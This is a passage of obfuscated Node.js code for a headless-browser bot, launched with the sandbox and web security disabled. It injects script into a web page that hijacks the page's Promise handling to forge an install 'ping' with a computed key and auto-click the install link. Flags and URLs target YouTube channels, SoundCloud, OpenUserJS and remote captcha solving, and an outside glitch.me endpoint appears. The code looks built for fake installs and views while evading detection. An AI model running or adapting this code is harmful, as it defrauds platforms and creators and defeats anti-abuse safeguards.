+ 0x2 * -0x2c8 + -0x333 * -0x9 & J['charCodeAt'](++M)), P[N >> -0x2 * 0x295 + -0x25d7 + -0xb * -0x3e9] |= (-0x1ae * -0xa + -0x1dbe + 0x2 * 0x6f1 | L >> 0x1 * -0x727 + 0x11ce + -0xa95) << y[-0x252b + -0x1be5 + 0x1 * 0x4113 & N++], P[N >> 0xdc5 + 0xda9 * -0x2 + 0xd8f] |= (0x1 * 0x11db + -0x1996 + 0x31 * 0x2b | L >> -0x2 * 0x2f + -0x163b + 0x16a5 & -0x9c * 0x27 + 0x2 * 0xf6b + -0x6d3) << y[0x1 * 0x10e7 + 0x1aae + -0x2b92 & N++], P[N >> 0x937 + -0x19b + -0x79a] |= (-0x1af6 + -0x1 * -0x1589 + -0x5ed * -0x1 | L >> -0x107 * -0x1d + -0x5e6 + 0x9 * -0x2a7 & 0x2 * 0x10ba + 0xac1 * 0x1 + 0x2bf6 * -0x1) << y[-0xd46 * -0x1 + -0x1ec4 + 0x1181 & N++], P[N >> -0x1da2 + -0x224 + 0x1fc8] |= (-0x1 * -0x1466 + 0x1 * -0x106c + 0x5 * -0xb2 | -0x16a3 + -0x189 + 0x7 * 0x37d & L) << y[-0x175f * -0x1 + -0x1895 + 0x139 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x67a + -0x582 * 0x4 + 0x1cc2 ? (this['block'] = P[0xd * 0x201 + 0x1 * 0x19ee + -0x1 * 0x33eb], this['start'] = N - (0x89f * -0x2 + 0xf3b + 0x3 * 0xc1), this['hash'](), this['hashed'] = 0x2 * 0xe0a + -0x1cef + 0x4 * 0x37) : this['start'] = N;
                }
                return this['bytes'] > 0x11372e4 + 0x1a7e9b4ef + -0x3854629c * 0x3 && (this['hBytes'] += this['bytes'] / (-0x19f8e92d0 + -0x2673d900 + 0x2c6026bd0) << 0x148 + -0x3 * -0x823 + 0x19b1 * -0x1, this['bytes'] = this['bytes'] % (-0x1fc0b3b8 * 0xd + 0xe1787f84 + 0x24e * 0xc05a86)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x787 * 0x3 + 0x131 * 0x8 + -0x201c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xdfe + 0x1 * 0xafa + 0x314] = this['block'], J[K >> -0x1465 + 0x13fc + 0x1 * 0x6b] |= x[-0x55d * -0x5 + -0x25d3 + -0x5b * -0x1f & K], this['block'] = J[-0x11 * -0x6b + 0x2050 * 0x1 + -0x275b], K >= -0x847 * -0x1 + 0x10d * 0xf + 0x17d2 * -0x1 && (this['hashed'] || this['hash'](), J[-0x373 + 0x2656 + 0x27 * -0xe5] = this['block'], J[0x14e1 + -0x254c + 0x107b * 0x1] = J[0x38 * -0xd + -0x1677 + 0x1950] = J[-0x2631 + 0x325 + -0x1 * -0x230e] = J[-0x245a * 0x1 + -0x1 * -0x1ad9 + 0xc * 0xcb] = J[0x7 * -0x346 + -0x1259 + 0x2947] = J[-0x1 * -0x76a + 0x1 * -0x1cb7 + -0x1 * -0x1552] = J[-0x545 + -0x7 * 0x3c1 + 0x1f92] = J[-0x136a + 0x6d * -0xb + 0x1 * 0x1820] = J[0x1285 * -0x2 + 0x6f3 + 0xb * 0x2bd] = J[-0xba4 + 0xe * 0x157 + -0x715] = J[-0x22 * 0x92 + -0xf51 + 0x22bf] = J[0x1ffd + 0xa7f * -0x2 + -0xaf4] = J[0x192b + 0x35 * 0x9d + -0x39a0] = J[0x1 * -0x21b9 + 0x1dc5 + -0x29 * -0x19] = J[-0x24 * -0xef + -0x2581 + 0x3 * 0x151] = J[-0xd1 * 0x16 + 0x2304 + -0x10ff * 0x1] = 0x2 * -0x233 + -0xb * -0x126 + -0x83c), J[0x1 * 0x1f11 + 0x12a2 + -0x31a5] = this['hBytes'] << 0x53 * 0x4e + -0x13ad + 0x59a * -0x1 | this['bytes'] >>> 0xaa + 0x2 * 0x2e7 + -0x1 * 0x65b, J[0x20cf + -0x11fb + -0xec5] = this['bytes'] << -0x1 * -0x268a + -0x2419 * 0x1 + -0x26e, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xf * 0x20e + 0x1 * -0xd51 + -0x1171; J < 0xf4b + 0x1 * 0x22e4 + -0x31df; ++J)
                K = Q[J - (0x1 * -0x1099 + 0x18af + -0x813 * 0x1)] ^ Q[J - (-0x7df + 0x18da * -0x1 + 0x20c1)] ^ Q[J - (0x1 * 0x24af + 0x1929 + -0x3dca)] ^ Q[J - (0x6a * -0x5d + -0x12a3 * 0x1 + -0x1f9 * -0x1d)], Q[J] = K << 0x15a7 + -0x2 * -0xe09 + -0x56 * 0x94 | K >>> 0x6 * -0x329 + -0x10ca * 0x1 + 0x23df;
              for (J = -0xcee + -0x13f2 + 0x10 * 0x20e; J < 0x1411 + 0x34 * 0x11 + -0x1771 * 0x1; J += 0x3 * 0x4c7 + -0x5db + -0x875)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xad0 + -0xa8d + -0x77 * -0x2e | L >>> -0x37c * -0x4 + -0x10bc + 0x1 * 0x2e7) + (M & N | ~M & O) + P + (0x326a70c1 + 0x8b7670a * -0x14 + -0x6eab66 * -0x1f0) + Q[J] << 0x756 + -0x1 * -0x1fd + 0x953 * -0x1) << 0xce5 + -0xf01 + 0x221 | P >>> 0xcde + 0x4a2 + -0x1165) + (L & (M = M << -0x2195 * -0x1 + -0x1301 + -0xe76 | M >>> 0x5 * -0x259 + -0x8b + 0xc4a) | ~L & N) + O + (-0x65feef * -0x5e + -0x5eb3239e + -0x141f * -0x757eb) + Q[J + (0xf8e * 0x1 + 0xf * 0x28c + 0x35c1 * -0x1)] << -0xf68 + 0x179 * -0x17 + 0x3147) << 0x22c5 + 0x1608 + -0x38c8 | O >>> -0x7f * -0x2b + -0x85 + -0x24d * 0x9) + (P & (L = L << 0x12d * -0x7 + 0x1 * 0x217f + 0x25 * -0xae | L >>> -0x1 * 0xddb + -0x1 * 0x601 + 0x13de) | ~P & M) + N + (0x2a37 * 0x24fdf + -0xf4ab8e * 0xb1 + 0xa21357de) + Q[J + (-0x1be5 + 0x1bf3 + -0xc)] << -0x24c7 + 0x1d * 0x38 + 0x1e6f) << 0x1 * -0x1a15 + 0x6d * 0x29 + 0x8a5 | N >>> 0x1b9c + -0x424 + -0x175d) + (O & (P = P << 0x36 * -0x99 + -0x12 * -0x192 + 0x420 | P >>> 0x830 * 0x4 + -0x1 * 0x1d9 + -0x1 * 0x1ee5) | ~O & L) + M + (0x1 * -0x831795e9 + -0x329b * 0x23905 + 0x14e158f89) + Q[J + (-0x331 * -0x6 + -0x61a + 0x2f * -0x47)] << 0x1592 + -0x1d25 * -0x1 + -0x32b7 * 0x1) << 0x37 * -0x8b + -0xaea + 0x28cc | M >>> -0x1 * 0x264b + -0x19 * -0xde + 0x10b8) + (N & (O = O << -0x5bc + -0x241 * 0x11 + -0x3 * -0xeb9 | O >>> -0x318 + 0x1 * -0x1e51 + 0x216b) | ~N & P) + L + (0x79051fc4 + -0x52220c49 + 0xdad * 0x3c656) + Q[J + (-0xbf6 * -0x1 + 0x228b + -0x2e7d)] << 0x18d2 + 0x1 * 0x1e27 + 0x36f9 * -0x1, N = N << -0x43b + 0x1d * 0xdd + -0x14b0 | N >>> -0x69e + -0xa6d * 0x3 + 0x25e7;
              for (; J < -0x9 * 0x277 + 0x1 * 0x203f + 0x27a * -0x4; J += 0x198d + -0x1137 * -0x2 + -0xa * 0x5ff)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc7 * 0x1 + -0xb5d * 0x1 + -0xc29 * -0x1 | L >>> 0x23ab + 0x1cc * 0xc + -0x8 * 0x724) + (M ^ N ^ O) + P + (0x117d0a16 + 0xb30b05f8 + 0x215 * -0x2926f9) + Q[J] << -0xc * -0x2ea + -0x2608 + 0x70 * 0x7) << -0x6 * 0x3df + -0x2a7 * -0x2 + 0x3 * 0x5fb | P >>> 0x2662 + -0xe24 * -0x2 + 0xb * -0x60d) + (L ^ (M = M << 0x4d4 + 0x1 * 0x1671 + -0x1b27 | M >>> -0x1db9 + -0x5 * -0x28b + 0x1104 * 0x1) ^ N) + O + (-0x987d1 * 0x421 + 0xb2271ce2 + -0x1bf36b50) + Q[J + (0x1d1c + -0x1e51 + 0x136)] << -0xd4c + 0x5 * 0x41a + -0x736) << -0x511 * -0x2 + -0x6cd * -0x2 + -0x17b7 | O >>> -0xb * -0x271 + 0x1700 + -0x31c0) + (P ^ (L = L << -0xf1b + 0x74 * 0x52 + -0x15ef | L >>> -0x1e7 + -0x1 * 0x30f + -0x2 * -0x27c) ^ M) + N + (0x493e524 * -0x17 + -0x49452b * -0x1a9 + 0x5e7fad7a) + Q[J + (-0x2285 * 0x1 + 0x1 * 0x1da9 + 0x4de)] << 0x9fc + 0x324 * -0x3 + -0x90) << -0x5b2 * -0x1 + 0x26ff + -0x2cac * 0x1 | N >>> -0x193a + -0xf2 + 0x1 * 0x1a47) + (O ^ (P = P << -0x1413 + -0x1356 + 0x2787 | P >>> 0x7 * -0x463 + 0x102b + 0xe8c) ^ L) + M + (-0x1 * 0x534ef20a + -0x4cf5d13c + 0x10f1eaee7) + Q[J + (-0xfa5 + -0x4 * 0x6d9 + -0x13 * -0x244)] << -0x1647 * -0x1 + -0x2186 + -0xb3f * -0x1) << -0x743 + -0xb74 + -0x4 * -0x4af | M >>> 0x12b2 + -0xd20 + -0x577) + (N ^ (O = O << 0x17e6 + -0x1fb8 * -0x1 + -0x3780 | O >>> 0x1a09 + -0x93 + -0x2 * 0xcba) ^ P) + L + (0x41038425 + -0x1fd8de7 * 0x61 + 0xeee92c03) + Q[J + (0x6f * 0x4a + 0x32 * -0xc7 + -0x1d * -0x3c)] << -0x22bf + -0x5 * 0x6b1 + 0x4434, N = N << -0x1497 + 0x6fa * 0x1 + 0xb9 * 0x13 | N >>> 0x2 * -0x2e + -0x7b0 * 0x1 + 0x80e;
              for (; J < 0x1524 + -0x1c1a + -0x6 * -0x133; J += 0xe * 0x16a + 0x1869 + 0x7 * -0x650)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2159 + -0x1537 + 0x3695 | L >>> -0x9b + 0x2223 * -0x1 + 0x22d9) + (M & N | M & O | N & O) + P - (-0xb30e0ec9 + -0x923 * 0xe8410 + 0x1a892f01d) + Q[J] << 0x1a3 * 0x14 + -0x1cbe + -0x3fe) << 0x1 * -0x260f + -0x266c + 0x4c80 | P >>> 0xf45 + -0xfd0 + 0xa6) + (L & (M = M << -0x245f * -0x1 + -0x5 * -0x544 + -0x3e95 * 0x1 | M >>> 0x49 * -0x29 + -0x4f7 * 0x1 + 0x2c7 * 0x6) | L & N | M & N) + O - (0x1f82470e + -0x90e835ec + 0xe24a3202) + Q[J + (0x1311 + 0xf53 + 0x2263 * -0x1)] << -0x2531 + 0x132b + 0x1206) << -0x17a1 + 0x1a75 * 0x1 + -0x2cf * 0x1 | O >>> -0x26c6 + 0xc7a + 0x3 * 0x8cd) + (P & (L = L << -0x135d + -0x1 * -0xd6a + 0x611 | L >>> 0x19e5 + 0x1456 + -0x1 * 0x2e39) | P & M | L & M) + N - (-0x4e * -0x1fb49a6 + -0x9e281 * 0x91c + 0x305f21ac) + Q[J + (-0x20ba + -0xf * -0x11b + 0x1027)] << 0x9e * -0x8 + -0x1851 + -0x1d41 * -0x1) << -0x13bc + -0x13f0 + 0x27b1 | N >>> 0x26f6 + 0x213b + -0x2 * 0x240b) + (O & (P = P << 0x1023 + 0x2148 + -0x314d | P >>> -0x187a + 0x1 * 0xca + 0x9 * 0x2a2) | O & L | P & L) + M - (-0x3b6246de + 0x4 * -0x202cecf2 + -0x3229b4f7 * -0x6) + Q[J + (-0x1958 * -0x1 + 0x738 + -0x208d)] << -0x1d1d + -0x25ac * -0x1 + 0x88f * -0x1) << 0xe0b * -0x1 + -0x18eb + 0x1 * 0x26fb | M >>> -0x2255 + 0x5a7 + 0x1cc9) + (N & (O = O << -0x222 * -0x4 + -0x35 * 0x4f + 0x7f1 | O >>> 0x7b * -0x1b + -0x115f * -0x2 + -0x3 * 0x741) | N & P | O & P) + L - (0x105ad2 * -0x621 + 0x381b7d0 + 0xd19f2c66) + Q[J + (-0x2580 + 0x1502 + -0x1 * -0x1082)] << -0x246e + 0x26db + -0x26d, N = N << -0x15bf + 0x2203 + -0xc26 * 0x1 | N >>> -0x1 * 0x60 + 0x1097 + -0x1035;
              for (; J < 0xae6 + -0xf * -0x5e + -0x1018; J += 0x1d99 + 0x1ae1 + -0x3875)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1869 + 0x1d * 0x9b + -0x29f3 | L >>> -0x9e * -0x1c + -0x9e1 * -0x1 + -0x1b0e) + (M ^ N ^ O) + P - (0x483df * -0x1143 + 0x482ca7c + 0x7f0ac60b) + Q[J] << -0x4a0 * -0x1 + 0x81 * -0xd + -0x11 * -0x1d) << -0x2e5 + -0xcc * -0x11 + -0x1 * 0xaa2 | P >>> 0x15a * -0x17 + 0x91d * 0x4 + -0x543) + (L ^ (M = M << 0x47c + 0x22 * 0xb6 + -0x1c8a | M >>> -0x4cb * 0x3 + -0x18d * 0x17 + -0x56 * -0x95) ^ N) + O - (0x74d568b + 0x1dce5a68 + -0x10818d37 * -0x1) + Q[J + (-0x1a6a + 0x155e + 0x50d)] << 0xb77 * -0x3 + -0x76 * 0x44 + -0x41bd * -0x1) << 0x61f + 0x1303 + -0x1 * 0x191d | O >>> -0x46e * -0x4 + -0x1 * -0xb29 + 0x7f * -0x3a) + (P ^ (L = L << -0x1 * -0x242a + -0xa4d + -0xa9 * 0x27 | L >>> -0x13a + -0xb70 + 0xcac) ^ M) + N - (0x32239596 + 0xfc3b * 0x1373 + -0xfb006ed) + Q[J + (-0x296 * 0x9 + 0x3bb * -0x1 + 0x1b03)] << -0x1 * 0x1844 + -0x1e95 + 0x36d9) << -0x5d6 + 0x5 * 0x124 + -0xd * -0x3 | N >>> 0x902 * 0x2 + 0x6f * 0x1f + 0x1f5a * -0x1) + (O ^ (P = P << 0x5af + -0x1b3 + -0x3de | P >>> -0x1228 + 0x3b * 0x7a + -0x9f4) ^ L) + M - (-0x1 * 0x1f8c505d + -0x2bc57b * -0x1d7 + 0x4a1393a) + Q[J + (-0x7 * -0x55b + 0x4 * 0x213 + -0x2dc6)] << -0xde6 + -0x1bd1 + -0x1 * -0x29b7) << -0x3cc + -0x26da + -0x1 * -0x2aab | M >>> 0x22b0 + 0x272 + -0x1 * 0x2507) + (N ^ (O = O << -0x5 * 0x7 + 0x2f * -0x2 + 0x9f | O >>> -0x1431 + -0x652 + 0x1a85) ^ P) + L - (0xf * -0x37e3c33 + 0x27b1e286 + 0x2ef87 * 0x1697) + Q[J + (0x7e2 + -0x11 * -0x5e + -0xe1c)] << -0x6 * -0x5c5 + -0x14d * 0x1e + 0x468, N = N << 0x43 * 0x8e + -0x7c3 + -0x1d49 | N >>> -0x1f * -0x3e + -0xa * -0x1c1 + -0x190a;
              this['h0'] = this['h0'] + L << 0x13f0 + -0x1f95 + 0xba5, this['h1'] = this['h1'] + M << 0x235d + 0x1dfe + 0x743 * -0x9, this['h2'] = this['h2'] + N << 0x1b41 + -0x8f5 * -0x2 + -0x2d2b, this['h3'] = this['h3'] + O << 0xf94 * 0x1 + 0x234b + 0x5a7 * -0x9, this['h4'] = this['h4'] + P << -0x1c3f + 0x1 * -0x14a6 + -0x30e5 * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x3b * -0xa3 + 0x3 * 0x117 + 0x2 * 0x1134 & 0x2e + -0x2535 + 0x2516] + w[J >> 0xbc3 * 0x1 + -0x1fce + 0x1423 * 0x1 & -0x838 + 0x12 * 0x19a + -0x148d * 0x1] + w[J >> 0x3b3 * 0x6 + 0x16ae + -0x2ccc & -0x2 * -0x1235 + 0x1 * -0x1c83 + -0x7d8] + w[J >> -0x251 * 0x6 + 0x1786 + -0x990 & -0x16df * -0x1 + -0xb * 0x346 + 0x3 * 0x466] + w[J >> -0x163e + -0x2 * 0xd30 + 0x2 * 0x1855 & -0x8 * -0x74 + -0xa17 + 0x686] + w[J >> 0x7e5 + 0xbd7 + -0x13b4 & 0x1 * 0x12eb + -0xb35 + 0x1 * -0x7a7] + w[J >> -0x5 * -0x35f + 0x2037 + -0x310e & -0x265 + 0x1bc9 + -0x5 * 0x511] + w[-0x1feb + 0xf48 + 0x10b2 & J] + w[K >> -0x1a97 * 0x1 + -0x348 + 0x1dfb & -0x157 * 0xe + -0x217e + 0x344f] + w[K >> -0x1 * -0x111a + -0x2441 + 0x133f & 0x1 * 0x1a23 + -0x174c + 0x59 * -0x8] + w[K >> -0x1 * 0x263 + 0x210b + -0xf4a * 0x2 & 0x8 * -0x2de + 0x151a + -0x5 * -0x61] + w[K >> -0x1060 + 0xd65 + 0x30b & -0x516 + 0x1 * 0xcb9 + -0x14 * 0x61] + w[K >> 0x90 + 0x24e6 + -0x256a * 0x1 & 0x17a * 0x17 + -0x13f3 + -0xdf4] + w[K >> -0xa * 0x47 + 0x1369 * 0x1 + -0x109b & 0x37 * 0x5b + -0x5 * -0x602 + -0x3188] + w[K >> -0x452 + 0x1 * -0x269b + 0x2af1 & -0x1e3b + -0x1 * 0xa84 + 0x28ce] + w[-0x1 * 0xb95 + 0xa36 + 0x16e * 0x1 & K] + w[L >> 0x1 * -0x1dce + -0x7c2 + 0x25ac & -0x439 * -0x2 + 0x28 * -0x14 + 0x1 * -0x543] + w[L >> -0x174d + -0x26c * -0x6 + 0x1 * 0x8dd & -0x34 * 0x61 + -0x8d1 + -0x76 * -0x3e] + w[L >> -0x26ed + 0x12 * 0x1bb + 0x7db & 0x106 * 0x1b + 0x695 + -0x2 * 0x1114] + w[L >> -0x1 * 0xe71 + 0x6c5 + 0x7bc & 0x4 * 0x515 + 0xa * 0x11d + 0x1f67 * -0x1] + w[L >> -0x20c2 + 0x225f + 0x191 * -0x1 & 0x23c7 * 0x1 + -0x6ab * -0x5 + -0x450f] + w[L >> 0x25c2 + 0x1c2c + -0x41e6 & -0x70d + -0x2197 * -0x1 + -0x1a7b] + w[L >> -0x4ed + -0x2 * -0x1cd + -0x157 * -0x1 & 0x209 * 0x5 + -0xd7 + -0x947] + w[-0x3 * 0xad + 0x1 * -0x143c + 0xb29 * 0x2 & L] + w[M >> -0x26ba + -0x1117 + -0x37ed * -0x1 & 0x5c6 + 0x132e * 0x2 + -0x2c13] + w[M >> -0x1efd + -0x1 * 0x201a + -0x5 * -0xca3 & 0x1713 + 0x2674 + -0x3d78] + w[M >> -0xc0 * 0x18 + 0x1 * 0x1b31 + -0x91d & -0x1c38 + 0xe69 + 0xdde] + w[M >> 0xb89 + -0x481 + -0x2 * 0x37c & -0x62 * 0x53 + 0x39 * -0xa + 0x1 * 0x220f] + w[M >> -0x2334 + 0x827 * -0x3 + 0x3bb5 & -0x114f + 0x7ed + 0x971] + w[M >> 0xca9 + 0x13 * 0xef + -0x1e5e & -0x3f4 + 0x22cf + -0x1ecc] + w[M >> -0x1a3d + 0x1fae * 0x1 + 0x3 * -0x1cf & 0x410 + -0x26f1 + -0x45e * -0x8] + w[-0x2d * -0x2c + -0x24c7 + 0x1d1a & M] + w[N >> 0x1380 + 0x336 + -0x2 * 0xb4d & 0x19cf * 0x1 + -0x1f43 + 0x583] + w[N >> -0x1 * 0x506 + 0x349 * 0x5 + 0x1 * -0xb4f & 0x17dd + 0x1cbd * -0x1 + 0x4ef] + w[N >> 0x2d1 * 0x7 + 0x1 * -0x16e1 + 0x33e & -0xeb0 + -0x3 * -0x807 + -0x956] + w[N >> 0x1 * -0x79f + 0x822 * -0x3 + 0x2015 & 0x8c0 + -0x236d + 0x1abc] + w[N >> -0x1d4c + -0x1626 + 0x152 * 0x27 & 0x1 * 0xc35 + 0xf08 + 0xd97 * -0x2] + w[N >> 0xdff + 0x1 * -0x170b + -0x914 * -0x1 & 0x10c6 + -0x3a * 0x1f + 0x3 * -0x33b] + w[N >> -0x1 * 0x185b + -0x4 * 0x973 + -0x3e2b * -0x1 & 0x639 + -0xd * 0x289 + -0x1acb * -0x1] + w[0xec8 + -0xaf3 * 0x1 + -0x17 * 0x2a & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1a8c + -0x1 * -0x1b9d + 0x3611 * -0x1 & -0x237f + 0xb1a + -0x514 * -0x5,
                J >> 0xd * -0x9a + 0x133 * 0x7 + 0x83 * -0x1 & 0x1f18 + -0x13 * -0x181 + 0x2 * -0x1d56,
                J >> 0x1d22 + 0x2525 * -0x1 + 0x80b & 0xfb3 * 0x2 + -0xeb3 + -0xfb4,
                0x18fc + 0x18 * -0xe0 + -0x2fd & J,
                K >> 0x1a9b + -0xda * 0x3 + -0x1 * 0x17f5 & 0x1c6 * -0x5 + 0x23b4 + -0x19d7,
                K >> -0x1a * -0x123 + 0xae0 + -0x285e & 0xcde + 0x4 * -0x277 + 0x67 * -0x5,
                K >> 0x17ca + 0x183 * -0x16 + -0x26 * -0x40 & 0xd * -0x26e + -0x11b2 + 0xd3 * 0x3d,
                0x224 + -0x154 + -0x2f * -0x1 & K,
                L >> -0x1 * 0x13cf + 0x1902 + -0x51b & -0x3 * -0x86a + -0x13 * -0x97 + 0x2 * -0x11ba,
                L >> 0xd0 * -0x4 + -0x146b * 0x1 + 0x17bb & -0xfbf + -0xf12 + -0x8 * -0x3fa,
                L >> -0x2ce * -0xb + -0x1505 * 0x1 + -0x1 * 0x9cd & -0x15df * 0x1 + 0x2 * 0x9f5 + 0x2f4,
                0x1 * -0x201e + 0x5e9 * -0x1 + 0x2706 & L,
                M >> -0x1a2d * 0x1 + -0x17d9 + -0x2 * -0x190f & -0x16 * -0x14 + -0x1791 + 0x16d8,
                M >> 0x1 * 0x1285 + -0x1df3 + 0x2 * 0x5bf & -0x4b3 * 0x2 + -0x4 * 0x822 + -0x3e7 * -0xb,
                M >> 0x1 * 0x1543 + 0x1 * 0x1468 + 0xb * -0x3c9 & 0x16d6 + 0x9eb + 0x10f * -0x1e,
                0x2 * 0x856 + -0x12e * -0x8 + -0x191d & M,
                N >> -0x16c4 * 0x1 + -0x1 * -0x1989 + -0x2ad & -0x9ed * 0x3 + 0x1af6 + 0x1e8 * 0x2,
                N >> -0x11c1 + 0x3e4 + -0x1 * -0xded & 0x1e0f + -0xff7 * 0x2 + 0x2de * 0x1,
                N >> -0x38 * -0x9 + -0x2125 + 0x1f35 & -0x11 * 0x8a + -0x1 * 0xdce + 0x1 * 0x17f7,
                0x751 + -0x72d + 0xdb * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xb0 * 0x10 + 0x1989 + -0x1 * 0xe75), (K = new DataView(J))['setUint32'](0x2 * 0xe6d + -0x24f4 * 0x1 + 0x81a, this['h0']), K['setUint32'](-0x87f + -0x5 * -0x313 + -0x6dc, this['h1']), K['setUint32'](-0x1 * 0xce9 + 0x4ea * 0x1 + 0x807, this['h2']), K['setUint32'](-0x110a + 0xe * -0x10c + 0x11 * 0x1de, this['h3']), K['setUint32'](0x1dcc + 0x18ef * -0x1 + -0x4cd, this['h4']), J;
            }
        }
        G['prototype'][Z(0x6, 'iryb')] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + a0(0x11) + 'me']('install-li' + 'nk')[-0x248d + -0x1 * -0x26cf + -0x121 * 0x2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xa5 + 0x9 * 0xc4 + -0x63f;
            J[-0x95f + 0x1 * 0x25db + -0xe3e * 0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0x144b + -0x2127 + -0x1 * -0xcdc] = L => {
              const a1 = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1d2d + -0x6b6 * -0x1 + -0x59e * -0x4), O['overrideMi' + a1(0x19)]('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1d8a + -0x1 * 0x18a7 + 0x1 * 0x3632;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x117a + 0x14 * -0x140 + 0xd62), Promise['resolve'](0xea * -0x17 + 0x261e + -0x1117);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x3b * -0x1f + 0x101d + -0x1742; j < 0x827 + -0x26dc + -0x2 * -0xf5b; j++)
    i();
}
const NETWORK_PATIENCE = -0xe96 * -0x3 + -0x194f + 0x1 * 0xccd + (0x5 * 0x65f + 0x1 * -0x203e + 0xc1b) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1575 + 0xaee * -0x1 + -0xa84) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require(a2(0x9)),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1 * 0x419 + -0x18c9 + 0x1ce2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
